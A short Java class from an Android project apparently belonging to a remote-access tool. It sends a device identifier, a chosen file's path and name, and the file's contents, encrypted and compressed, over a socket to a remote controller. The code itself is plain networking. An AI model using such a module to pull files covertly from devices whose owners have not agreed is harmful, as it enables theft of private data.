package com.qooport.android.servidor;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import com.qooport.android.Principal;
import com.qooport.android.Servicio;
import com.qooport.android.utilidades.Compresor;
import com.qooport.android.utilidades.Protocolo;
import com.qooport.android.utilidades.cifrado.Encriptacion;
public class EnviarArchivo
        extends Thread {
    private File archivo;
    private Servicio conexion;
    private boolean activo;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    public EnviarArchivo(String rutaArchivo, Servicio conex) {
        archivo = new File(rutaArchivo);
        this.conexion = conex;
        activo = true;
    }
    public void detenerEnvio() {
        activo = false;
    }
    @Override
    public void run() {
        try {
            Socket socket = new Socket(conexion.getHost(), (conexion.getPuertoTransferencias()));
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            out.writeInt(Protocolo.descargar);
            out.flush();
//            out.writeObject(Encriptacion.cifra(Principal.identificador));
            out.writeObject(Compresor.comprimirGZIP(Encriptacion.cifra(Principal.identificador)));
            out.flush();
            out.writeObject(null); // el icono
            out.flush();
            out.writeObject(Compresor.comprimirGZIP(Encriptacion.cifra(archivo.getParent())));
            out.flush();
            out.writeObject(Compresor.comprimirGZIP(Encriptacion.cifra(archivo.getName())));
            out.flush();
            out.writeLong(archivo.length());
            out.flush();
            FileInputStream input = new FileInputStream(archivo);
            byte[] buf = new byte[1024];
            int i;
//            while ((i = input.read(buf)) > -1) {
            while ((i = input.read(buf)) > 0 && activo) {
                out.write(buf, 0, i);
            }
            out.flush();
            out.close();
        } catch (IOException ex) {
        }
    }
}
